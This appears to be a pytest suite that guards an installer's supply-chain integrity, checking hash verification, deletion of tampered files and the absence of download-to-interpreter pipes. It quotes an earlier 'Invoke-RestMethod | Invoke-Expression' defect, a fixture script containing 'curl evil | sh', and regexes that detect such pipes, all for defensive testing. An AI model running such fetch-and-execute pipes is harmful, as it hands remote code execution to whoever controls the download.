"""
Supply-chain integrity regression tests for the installers (audit finding F-3).

install.ps1 declares `#Requires -RunAsAdministrator` and drops code onto a
malware analyst's machine - including obsidian.dp64, which x64dbg loads into
the process that debugs live malware. Before F-3 neither installer verified a
single byte it downloaded: TLS proved *who served* the bytes, never *which*
bytes were served, so a tampered CDN copy, a swapped release asset, or an
interception proxy meant code execution as Administrator.

install.ps1 cannot be executed in CI (no Windows, no PowerShell), so its half
of this file is a static analysis of the script text: the properties asserted
are the ones whose loss would reintroduce the finding - no piping a freshly
downloaded script into an interpreter, no raw download outside the verifying
wrapper, and a hash assertion on every project-owned release asset. install.py
IS importable, so its half exercises the real verification helpers.

The assertions deliberately key on structure (which function a call sits in,
which helper is invoked) rather than exact formatting, so reformatting the
installers does not fail the suite but removing a check does.
"""

import ast
import os
import re
import shutil
import tempfile
from pathlib import Path

import pytest

import install

REPO_ROOT = Path(__file__).resolve().parent.parent
PS1_PATH = REPO_ROOT / "install.ps1"
PY_PATH = REPO_ROOT / "install.py"
INSTALL_MD_PATH = REPO_ROOT / "INSTALL.md"


# Helpers for reading install.ps1 as text


def read_ps1() -> str:
    return PS1_PATH.read_text(encoding="utf-8", errors="replace")


def strip_ps1_comments(text: str) -> str:
    """Remove <# block #> and # line comments so assertions about code are not
    satisfied (or tripped) by prose. Crude but adequate: install.ps1 has no '#'
    inside string literals that would matter here."""
    text = re.sub(r"<#.*?#>", "", text, flags=re.DOTALL)
    out = []
    for line in text.splitlines():
        stripped = line.strip()
        if stripped.startswith("#"):
            continue
        out.append(line)
    return "\n".join(out)


def ps1_function_body(text: str, name: str) -> str:
    """Return the source of a top-level `function <name> {` from install.ps1.

    Every function in install.ps1 starts at column 0, so the body runs from the
    declaration to the next column-0 `function` (or end of file).
    """
    lines = text.splitlines()
    start = None
    for i, line in enumerate(lines):
        if re.match(rf"^function\s+{re.escape(name)}\b", line):
            start = i
            break
    assert start is not None, f"install.ps1 no longer defines function {name}"

    for j in range(start + 1, len(lines)):
        if re.match(r"^function\s+\S", lines[j]):
            return "\n".join(lines[start:j])
    return "\n".join(lines[start:])


# install.ps1: no unverified remote code execution


def test_ps1_never_pipes_a_download_into_invoke_expression():
    """The original defect at install.ps1:562 was

        Invoke-RestMethod https://astral.sh/uv/install.ps1 | Invoke-Expression

    i.e. a nested curl|iex inside an elevated installer. Nothing downloaded may
    be piped into Invoke-Expression / iex again.
    """
    code = strip_ps1_comments(read_ps1())

    offenders = [
        line.strip()
        for line in code.splitlines()
        if re.search(r"\|\s*(Invoke-Expression|iex)\b", line, re.IGNORECASE)
    ]
    assert not offenders, (
        "install.ps1 pipes something into Invoke-Expression again: " + "; ".join(offenders)
    )

    # And the specific regression: no `iex`/`Invoke-Expression` anywhere near a URL.
    assert not re.search(
        r"(Invoke-Expression|iex)\b[^\n]*https?://", code, re.IGNORECASE
    ), "install.ps1 executes a URL's contents directly"


def test_ps1_uv_installer_is_downloaded_verified_then_executed():
    """uv must be installed from a file that went through Invoke-VerifiedDownload,
    executed with -File rather than by interpreting a network response."""
    body = ps1_function_body(read_ps1(), "Install-UV")

    assert "Invoke-VerifiedDownload" in body, "Install-UV no longer verifies the uv installer"
    assert "https://astral.sh/uv/install.ps1" in body
    assert re.search(r"-HashKey\s+\"uv-installer-ps1\"", body), (
        "Install-UV must pass a HashKey so an operator can pin the uv installer"
    )
    assert "-File $uvInstaller" in body, (
        "Install-UV should execute the verified file on disk, not a piped stream"
    )


def test_ps1_all_downloads_go_through_the_verifying_wrapper():
    """`Invoke-WebRequest` is what writes remote bytes to disk. It may only
    appear inside Invoke-VerifiedDownload (which hashes what it fetched) or
    Get-ReleaseChecksumMap (which fetches the checksum manifest itself - text
    that is parsed, never executed, and whose authority is the release it is
    published in). Anywhere else is a download nobody verified."""
    text = read_ps1()
    code = strip_ps1_comments(text)

    allowed = ("Invoke-VerifiedDownload", "Get-ReleaseChecksumMap")
    allowed_bodies = [strip_ps1_comments(ps1_function_body(text, name)) for name in allowed]

    for line in code.splitlines():
        if "Invoke-WebRequest" not in line:
            continue
        assert any(line in body for body in allowed_bodies), (
            f"install.ps1 downloads outside the verifying wrapper: {line.strip()}"
        )

    # Callers reach the network only through the wrapper.
    for func_name in ("Install-Ghidra", "Install-X64Dbg", "Install-WinDbg", "Install-BinaryMCP"):
        body = strip_ps1_comments(ps1_function_body(text, func_name))
        assert "Invoke-WebRequest" not in body, (
            f"{func_name} downloads directly instead of via Invoke-VerifiedDownload"
        )


# install.ps1: the hash assertion itself


def test_ps1_assert_filehash_uses_sha256_deletes_and_throws():
    text = read_ps1()
    body = ps1_function_body(text, "Assert-FileHash")
    # Hashing itself lives in the Get-FileSha256 helper.
    hashing = body + "\n" + ps1_function_body(text, "Get-FileSha256")

    assert re.search(r"Get-FileHash[^\n]*-Algorithm\s+SHA256", hashing), (
        "Assert-FileHash must hash with SHA-256"
    )
    # Get-FileHash returns uppercase, manifests are usually lowercase.
    assert "OrdinalIgnoreCase" in body, "hash comparison must be case-insensitive"
    assert "Remove-Item" in body, "a file that failed verification must be deleted"
    assert "throw" in body, "a hash mismatch must be fatal, not a warning"

    # The error has to name both values or it is not actionable.
    mismatch_message = body[body.index("mismatch"):]
    assert "expected" in mismatch_message and "got" in mismatch_message


def test_ps1_unverified_downloads_warn_loudly_and_can_be_made_fatal():
    text = read_ps1()
    warn_body = ps1_function_body(text, "Write-UnverifiedArtifactWarning")

    assert "UNVERIFIED DOWNLOAD" in warn_body, "the warning must be unmissable"
    assert "Write-Warn" in warn_body
    # It must print the digest actually downloaded, so the operator can pin it.
    assert "Get-FileSha256" in warn_body
    assert "Get-IntegrityEnvName" in warn_body
    # ... and strict mode must escalate it to a failure.
    assert "Test-StrictIntegrity" in warn_body
    assert "throw" in warn_body

    assert "$StrictIntegrity" in text, "install.ps1 must expose a -StrictIntegrity switch"
    assert "BINARY_MCP_STRICT_INTEGRITY" in text


def test_ps1_verified_download_verifies_or_warns_every_time():
    body = ps1_function_body(read_ps1(), "Invoke-VerifiedDownload")

    assert "Assert-FileHash" in body
    assert "Write-UnverifiedArtifactWarning" in body
    assert "Get-PinnedSha256" in body, "an operator-supplied pin must be honoured"


# install.ps1: the project's own release assets


def test_ps1_project_owned_assets_are_hash_checked_against_release_manifest():
    """obsidian.dp64/.dp32/obsidian_server.exe are OUR release assets, loaded by
    x64dbg next to live malware. They must be verified against the SHA256SUMS
    manifest published with the release, and must never be written straight into
    the x64dbg plugins directory unverified."""
    text = read_ps1()
    body = ps1_function_body(text, "Install-X64Dbg")

    assert "Get-ReleaseChecksumMap" in body, (
        "plugin install must consult the release checksum manifest"
    )
    assert "Invoke-VerifiedDownload" in body

    # The pre-fix code downloaded straight to the plugins directory.
    for bad in (
        r"-OutFile\s+\"\$plugin64Dir",
        r"-OutFile\s+\"\$plugin32Dir",
    ):
        assert not re.search(bad, body), (
            "plugin binaries are downloaded directly into the x64dbg plugins "
            "directory without staging/verification"
        )

    # Each artifact ends up in the plugins dir only via a copy from staging.
    for name in ("obsidian.dp64", "obsidian.dp32", "obsidian_server.exe"):
        assert re.search(rf"Copy-Item[^\n]*{re.escape(name)}", body), (
            f"{name} should be copied from the verified staging directory"
        )


def test_ps1_checks_authenticode_where_a_signature_is_expected():
    text = read_ps1()
    helper = ps1_function_body(text, "Assert-AuthenticodeValid")

    assert "Get-AuthenticodeSignature" in helper
    assert re.search(r"\$sig\.Status\s+-eq\s+'Valid'", helper), (
        "Authenticode check must test for Status -eq 'Valid'"
    )
    # Warning, not fatal, while our own release assets are unsigned.
    assert "AllowUnsigned" in helper
    assert "Write-Warn" in helper

    # Wired up at the call sites that matter: our plugin binaries, and the
    # Microsoft-signed Windows SDK bootstrapper that is then run elevated.
    assert "Assert-AuthenticodeValid" in ps1_function_body(text, "Install-X64Dbg")
    windbg = ps1_function_body(text, "Install-WinDbg")
    assert "Assert-AuthenticodeValid" in windbg
    assert "Microsoft Corporation" in windbg


def test_ps1_third_party_artifacts_have_overridable_pins():
    """Ghidra / x64dbg-snapshot / the SDK bootstrapper have no publishable fixed
    digest, so the plumbing must at least be there and operator-overridable."""
    text = read_ps1()

    assert "BINARY_MCP_SHA256_" in text, "no env-var override for pinned hashes"
    assert "$script:PinnedSha256" in text

    for key in ("ghidra-zip", "x64dbg-snapshot", "windows-sdk-setup", "repo-zip"):
        assert f"'{key}'" in text, f"missing pinnable hash key {key}"

    ghidra = ps1_function_body(text, "Install-Ghidra")
    assert re.search(r"-HashKey\s+\"ghidra-zip\"", ghidra)
    x64dbg = ps1_function_body(text, "Install-X64Dbg")
    assert re.search(r"-HashKey\s+\"x64dbg-snapshot\"", x64dbg)


# install.py: static structure


def _py_tree() -> ast.Module:
    return ast.parse(PY_PATH.read_text(encoding="utf-8"))


def _enclosing_function(tree: ast.Module, node: ast.AST) -> str:
    """Name of the function definition containing `node` (or '<module>')."""
    for func in ast.walk(tree):
        if isinstance(func, (ast.FunctionDef, ast.AsyncFunctionDef)):
            for child in ast.walk(func):
                if child is node:
                    return func.name
    return "<module>"


def _called_names(node: ast.AST) -> set:
    names = set()
    for child in ast.walk(node):
        if isinstance(child, ast.Call):
            func = child.func
            if isinstance(func, ast.Name):
                names.add(func.id)
            elif isinstance(func, ast.Attribute):
                names.add(func.attr)
    return names


def test_py_never_executes_a_downloaded_script_without_verification():
    """install.py fetched dot.net/v1/dotnet-install.sh and astral.sh/uv/install.sh
    to a temp file and handed them to bash/sh unverified. Any function that
    still runs a shell script must obtain it via download_and_verify_script."""
    tree = _py_tree()

    interpreters = {"sh", "bash", "zsh", "python", "python3", "powershell", "pwsh"}
    checked_any = False

    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        func = node.func
        is_run = (isinstance(func, ast.Attribute) and func.attr == "run") or (
            isinstance(func, ast.Name) and func.id in ("run_command",)
        )
        if not is_run or not node.args:
            continue
        first = node.args[0]
        if not isinstance(first, (ast.List, ast.Tuple)) or not first.elts:
            continue
        head = first.elts[0]
        if not (isinstance(head, ast.Constant) and head.value in interpreters):
            continue

        # An interpreter invoked with a variable argument: that argument has to
        # be a script this module downloaded AND verified.
        enclosing = _enclosing_function(tree, node)
        func_node = next(
            f for f in ast.walk(tree)
            if isinstance(f, ast.FunctionDef) and f.name == enclosing
        )
        assert "download_and_verify_script" in _called_names(func_node), (
            f"{enclosing}() runs {head.value} on a script it did not verify"
        )
        checked_any = True

    assert checked_any, (
        "expected install.py to still run downloaded installer scripts; "
        "update this test if that changed"
    )


def test_py_network_reads_are_confined_to_verified_helpers():
    """urlopen() anywhere else means a new download path that skipped the
    hashing wrapper."""
    tree = _py_tree()
    allowed = {
        "download_file",              # hashes or loudly warns
        "download_and_verify_script",  # hashes or loudly warns, before exec
        "fetch_github_release",       # JSON metadata, never executed
        "release_checksum_map",       # the checksum manifest itself
    }

    for node in ast.walk(tree):
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
            if node.func.id == "urlopen":
                enclosing = _enclosing_function(tree, node)
                assert enclosing in allowed, (
                    f"install.py downloads in {enclosing}(), outside the verified helpers"
                )


def test_py_ghidra_and_repo_downloads_pass_a_hash_key():
    """download_file() only verifies when it is told what to verify against."""
    tree = _py_tree()
    seen_keys = set()

    for node in ast.walk(tree):
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
            if node.func.id != "download_file":
                continue
            kwargs = {kw.arg for kw in node.keywords}
            assert "hash_key" in kwargs, (
                f"download_file() call on line {node.lineno} passes no hash_key, "
                "so the download can never be verified or pinned"
            )
            for kw in node.keywords:
                if kw.arg == "hash_key" and isinstance(kw.value, ast.Constant):
                    seen_keys.add(kw.value.value)

    assert {"ghidra-zip", "repo-zip"} <= seen_keys


# install.py: behaviour of the verification helpers


@pytest.fixture
def workdir():
    path = Path(tempfile.mkdtemp(prefix="installer-integrity-"))
    try:
        yield path
    finally:
        shutil.rmtree(path, ignore_errors=True)


@pytest.fixture(autouse=True)
def _clean_integrity_env(monkeypatch):
    """Never let a real BINARY_MCP_* env var leak into these tests."""
    for key in list(os.environ):
        if key.startswith("BINARY_MCP_"):
            monkeypatch.delenv(key, raising=False)


def test_verify_sha256_accepts_a_matching_digest_case_insensitively(workdir):
    target = workdir / "artifact.bin"
    target.write_bytes(b"plugin-bytes")
    digest = install.sha256_file(target)

    install.verify_sha256(target, digest.upper(), "artifact")
    assert target.exists()


def test_verify_sha256_deletes_the_file_and_raises_on_mismatch(workdir):
    target = workdir / "artifact.bin"
    target.write_bytes(b"tampered-plugin")
    actual = install.sha256_file(target)

    with pytest.raises(ValueError) as excinfo:
        install.verify_sha256(target, "0" * 64, "obsidian.dp64")

    # Expected AND actual must both be in the message or it is not actionable.
    message = str(excinfo.value)
    assert "obsidian.dp64" in message
    assert "0" * 64 in message
    assert actual in message
    assert not target.exists(), (
        "a file that failed verification must not be left on disk where it "
        "could still be loaded or executed"
    )


def test_verify_sha256_rejects_a_malformed_expected_digest(workdir):
    target = workdir / "artifact.bin"
    target.write_bytes(b"x")

    with pytest.raises(ValueError):
        install.verify_sha256(target, "not-a-digest", "artifact")
    assert not target.exists()


def test_warn_unverified_reports_the_digest_and_how_to_pin_it(workdir, capsys):
    target = workdir / "ghidra.zip"
    target.write_bytes(b"ghidra")
    digest = install.sha256_file(target)

    install.warn_unverified(target, "Ghidra 11.0", "ghidra-zip", "https://example/ghidra.zip")

    out = capsys.readouterr().out
    assert "UNVERIFIED DOWNLOAD" in out
    assert digest in out
    assert "BINARY_MCP_SHA256_GHIDRA_ZIP" in out
    assert target.exists(), "warning alone must not delete the artifact"


def test_strict_integrity_turns_an_unverified_download_into_a_failure(workdir, monkeypatch):
    monkeypatch.setenv("BINARY_MCP_STRICT_INTEGRITY", "1")
    target = workdir / "ghidra.zip"
    target.write_bytes(b"ghidra")

    with pytest.raises(ValueError):
        install.warn_unverified(target, "Ghidra 11.0", "ghidra-zip", "https://example/ghidra.zip")
    assert not target.exists()


def test_pinned_hash_env_var_overrides_the_in_script_table(monkeypatch):
    assert install.pinned_sha256("ghidra-zip") is None
    monkeypatch.setenv("BINARY_MCP_SHA256_GHIDRA_ZIP", "ab" * 32)
    assert install.pinned_sha256("ghidra-zip") == "ab" * 32


def test_integrity_env_name_normalises_asset_names():
    assert install.integrity_env_name("uv-installer-sh") == "BINARY_MCP_SHA256_UV_INSTALLER_SH"
    assert (
        install.integrity_env_name("binary-mcp-obsidian.dp64")
        == "BINARY_MCP_SHA256_BINARY_MCP_OBSIDIAN_DP64"
    )


def test_download_file_verifies_against_a_pinned_hash(workdir, monkeypatch):
    """End-to-end over file:// - a pinned digest that does not match must fail
    the install rather than return a quiet False."""
    source = workdir / "source.bin"
    source.write_bytes(b"authentic-release-asset")
    dest = workdir / "downloaded.bin"

    monkeypatch.setenv("BINARY_MCP_SHA256_GHIDRA_ZIP", install.sha256_file(source))
    assert install.download_file(source.as_uri(), dest, "asset", hash_key="ghidra-zip")
    assert dest.read_bytes() == b"authentic-release-asset"

    monkeypatch.setenv("BINARY_MCP_SHA256_GHIDRA_ZIP", "cd" * 32)
    with pytest.raises(ValueError):
        install.download_file(source.as_uri(), dest, "asset", hash_key="ghidra-zip")
    assert not dest.exists()


def test_download_and_verify_script_returns_a_verified_path(workdir, monkeypatch):
    source = workdir / "install.sh"
    source.write_text("#!/bin/sh\necho hi\n")
    monkeypatch.setenv("BINARY_MCP_SHA256_UV_INSTALLER_SH", install.sha256_file(source))

    script = install.download_and_verify_script(
        source.as_uri(), "uv installer script", "uv-installer-sh"
    )
    try:
        assert script.read_text() == "#!/bin/sh\necho hi\n"
    finally:
        script.unlink(missing_ok=True)


def test_download_and_verify_script_refuses_a_tampered_script(workdir, monkeypatch):
    source = workdir / "install.sh"
    source.write_text("#!/bin/sh\ncurl evil | sh\n")
    monkeypatch.setenv("BINARY_MCP_SHA256_UV_INSTALLER_SH", "ef" * 32)
    # Land the temp copy inside workdir so the cleanup assertion below is exact.
    monkeypatch.setattr(tempfile, "tempdir", str(workdir))

    with pytest.raises(ValueError):
        install.download_and_verify_script(
            source.as_uri(), "uv installer script", "uv-installer-sh"
        )

    leftovers = [p for p in workdir.glob("*.sh") if p != source]
    assert not leftovers, (
        "a script that failed verification must not be left in the temp directory, "
        "where it could still be handed to sh"
    )


def test_release_checksum_map_parses_a_published_sha256sums(workdir):
    asset = workdir / "obsidian.dp64"
    asset.write_bytes(b"plugin")
    digest = install.sha256_file(asset)

    manifest = workdir / "SHA256SUMS"
    manifest.write_text(
        "# binary-mcp release checksums\n"
        f"{digest}  obsidian.dp64\n"
        f"{'11' * 32} *obsidian_server.exe\n"
    )

    release = {
        "assets": [
            {"name": "SHA256SUMS", "browser_download_url": manifest.as_uri()},
            {"name": "obsidian.dp64", "browser_download_url": asset.as_uri()},
        ]
    }

    checksums = install.release_checksum_map(release)
    assert checksums["obsidian.dp64"] == digest
    assert checksums["obsidian_server.exe"] == "11" * 32
    assert install.release_asset_checksum(release, "obsidian.dp64", checksums) == digest


def test_release_checksum_map_parses_a_single_digest_sha256_asset(workdir):
    manifest = workdir / "ghidra.zip.sha256"
    manifest.write_text("22" * 32 + "\n")

    release = {
        "assets": [
            {"name": "ghidra.zip.sha256", "browser_download_url": manifest.as_uri()},
        ]
    }
    assert install.release_checksum_map(release)["ghidra.zip"] == "22" * 32


def test_checksum_from_release_notes_only_accepts_a_nearby_digest():
    release = {
        "body": (
            "## Release\n"
            "ghidra_11.3_PUBLIC.zip\n"
            f"SHA-256: {'33' * 32}\n"
            "\n"
            "Unrelated section\n"
            f"{'44' * 32}\n"
        )
    }
    assert (
        install.checksum_from_release_notes(release, "ghidra_11.3_PUBLIC.zip") == "33" * 32
    )
    assert install.checksum_from_release_notes(release, "not_mentioned.zip") is None


# INSTALL.md documents the risk


def test_install_md_documents_the_curl_pipe_interpreter_risk():
    text = INSTALL_MD_PATH.read_text(encoding="utf-8")

    assert "Supply-Chain Integrity" in text
    # The pattern is named, and an alternative is given with real commands.
    assert "| iex" in text or "irm" in text
    assert "sha256sum" in text
    assert "Get-FileHash" in text
    assert "-OutFile" in text
    # Pinning and strict mode are discoverable from the docs.
    assert "BINARY_MCP_SHA256_" in text
    assert "StrictIntegrity" in text
    assert "BINARY_MCP_STRICT_INTEGRITY" in text


def test_install_md_no_longer_advertises_a_bare_pipe_to_interpreter_install():
    """The quick-start used to lead with `curl ... | python3 -` and `irm ... | iex`
    for this project's own installers."""
    text = INSTALL_MD_PATH.read_text(encoding="utf-8")

    for pattern in (
        r"curl[^\n]*raw\.githubusercontent\.com[^\n]*\|\s*python3",
        r"irm[^\n]*raw\.githubusercontent\.com[^\n]*\|\s*iex",
    ):
        assert not re.search(pattern, text), (
            f"INSTALL.md still recommends piping this project's installer into an "
            f"interpreter ({pattern})"
        )
